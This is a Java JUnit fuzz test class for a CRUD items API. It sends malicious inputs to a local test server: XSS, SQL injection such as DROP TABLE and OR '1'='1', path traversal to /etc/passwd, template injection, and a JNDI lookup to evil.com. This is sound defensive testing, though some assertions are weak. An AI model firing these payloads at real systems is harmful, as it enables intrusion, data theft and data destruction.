package com.crud.fuzz;

import com.crud.config.AppConfig;
import okhttp3.*;
import org.junit.jupiter.api.*;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Random;

import static org.junit.jupiter.api.Assertions.*;

@Disabled("Requires running server")
class FuzzTestingTest {
    private static AppConfig appConfig;
    private static int port;
    private static String baseUrl;
    private static OkHttpClient client;

    @BeforeAll
    static void setUp() throws Exception {
        appConfig = new AppConfig();
        
        io.javalin.Javalin javalin = appConfig.createApp();
        javalin.start(0);
        port = javalin.port();
        baseUrl = "http://localhost:" + port;
        
        client = new OkHttpClient();
        
        Thread.sleep(500);
    }

    @AfterAll
    static void tearDown() {
        appConfig.stop();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "'; DROP TABLE items;--",
        "${jndi:ldap://evil.com/a}",
        "<iframe src='javascript:alert(1)'>",
        "../../../etc/passwd",
        "{{7*7}}",
        "${TEMPLATE}",
        "<svg/onload=alert(1)>"
    })
    @DisplayName("Should handle malicious input in name field")
    void testFuzz_MaliciousNameInput(String maliciousInput) throws Exception {
        String requestBody = String.format("""
            {
                "name": "%s",
                "description": "Test",
                "category": "Test",
                "price": 100.0,
                "quantity": 10
            }
            """, maliciousInput);
        
        RequestBody body = RequestBody.create(requestBody, MediaType.get("application/json"));
        Request request = new Request.Builder()
            .url(baseUrl + "/api/items")
            .post(body)
            .build();
        Response response = client.newCall(request).execute();
        
        assertTrue(response.code() == 201 || response.code() == 400, 
            "Should accept or reject malicious input safely");
        
        if (response.code() == 201) {
            String responseBody = response.body().string();
            assertFalse(responseBody.contains("<script") && responseBody.contains("javascript:"),
                "Response should sanitize output");
        }
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "9999999999999999999999999999999999999999",
        "-9999999999999999999999999999999999999999",
        "NaN",
        "Infinity",
        "-Infinity",
        "1.7976931348623157E308",
        "abc123",
        "1e308"
    })
    @DisplayName("Should handle extreme numeric values")
    void testFuzz_ExtremeNumericValues(String value) throws Exception {
        String requestBody = String.format("""
            {
                "name": "Test",
                "description": "Test",
                "category": "Test",
                "price": %s,
                "quantity": 10
            }
            """, value);
        
        try {
            RequestBody body = RequestBody.create(requestBody, MediaType.get("application/json"));
            Request request = new Request.Builder()
                .url(baseUrl + "/api/items")
                .post(body)
                .build();
            Response response = client.newCall(request).execute();
            
            assertTrue(response.code() == 201 || response.code() == 400,
                "Should handle extreme values gracefully");
        } catch (Exception e) {
            fail("Should not throw exception: " + e.getMessage());
        }
    }

    @Test
    @DisplayName("Should handle empty JSON body")
    void testFuzz_EmptyJsonBody() throws Exception {
        RequestBody body = RequestBody.create("{}", MediaType.get("application/json"));
        Request request = new Request.Builder()
            .url(baseUrl + "/api/items")
            .post(body)
            .build();
        Response response = client.newCall(request).execute();
        
        assertEquals(400, response.code());
    }

    @Test
    @DisplayName("Should handle null values in JSON")
    void testFuzz_NullValues() throws Exception {
        String requestBody = """
            {
                "name": null,
                "description": null,
                "category": null,
                "price": null,
                "quantity": null
            }
            """;
        
        RequestBody body = RequestBody.create(requestBody, MediaType.get("application/json"));
        Request request = new Request.Builder()
            .url(baseUrl + "/api/items")
            .post(body)
            .build();
        Response response = client.newCall(request).execute();
        
        assertEquals(400, response.code());
    }

    @Test
    @DisplayName("Should handle very large JSON payload")
    void testFuzz_LargePayload() throws Exception {
        String largeString = "A".repeat(100000);
        String requestBody = String.format("""
            {
                "name": "%s",
                "description": "%s",
                "category": "Test",
                "price": 100.0,
                "quantity": 10
            }
            """, largeString, largeString);
        
        RequestBody body = RequestBody.create(requestBody, MediaType.get("application/json"));
        Request request = new Request.Builder()
            .url(baseUrl + "/api/items")
            .post(body)
            .build();
        Response response = client.newCall(request).execute();
        
        assertTrue(response.code() == 201 || response.code() == 400);
    }

    @Test
    @DisplayName("Should handle SQL injection in ID")
    void testFuzz_SQLInjectionInId() throws Exception {
        String[] maliciousIds = {
            "1; DROP TABLE items;--",
            "1' OR '1'='1",
            "1 UNION SELECT * FROM users",
            "admin'--",
            "1'; DELETE FROM items;--"
        };
        
        for (String id : maliciousIds) {
            Request request = new Request.Builder()
                .url(baseUrl + "/api/items/" + id)
                .get()
                .build();
            Response response = client.newCall(request).execute();
            
            assertTrue(response.code() == 400 || response.code() == 404,
                "Should reject SQL injection in ID");
        }
    }

    @Test
    @DisplayName("Should handle random fuzz input")
    void testFuzz_RandomInput() throws Exception {
        Random random = new Random();
        
        for (int i = 0; i < 50; i++) {
            String randomString = Long.toHexString(random.nextLong());
            
            try {
                Request request = new Request.Builder()
                    .url(baseUrl + "/api/items/" + randomString)
                    .get()
                    .build();
                Response response = client.newCall(request).execute();
                
                assertTrue(response.code() == 200 || response.code() == 404 || response.code() == 400,
                    "Should handle random input gracefully");
            } catch (Exception e) {
                fail("Should not throw exception for random input: " + e.getMessage());
            }
        }
    }

    @Test
    @DisplayName("Should handle concurrent requests")
    void testFuzz_ConcurrentRequests() throws Exception {
        int numThreads = 10;
        Thread[] threads = new Thread[numThreads];
        
        for (int i = 0; i < numThreads; i++) {
            final int threadNum = i;
            threads[i] = new Thread(() -> {
                try {
                    String requestBody = String.format("""
                        {
                            "name": "Thread %d Item",
                            "description": "Test",
                            "category": "Test",
                            "price": 100.0,
                            "quantity": 10
                        }
                        """, threadNum);
                    
                    RequestBody body = RequestBody.create(requestBody, MediaType.get("application/json"));
                    Request request = new Request.Builder()
                        .url(baseUrl + "/api/items")
                        .post(body)
                        .build();
                    client.newCall(request).execute();
                } catch (Exception e) {
                }
            });
        }
        
        for (Thread t : threads) t.start();
        for (Thread t : threads) t.join();
        
        assertTrue(true);
    }
}
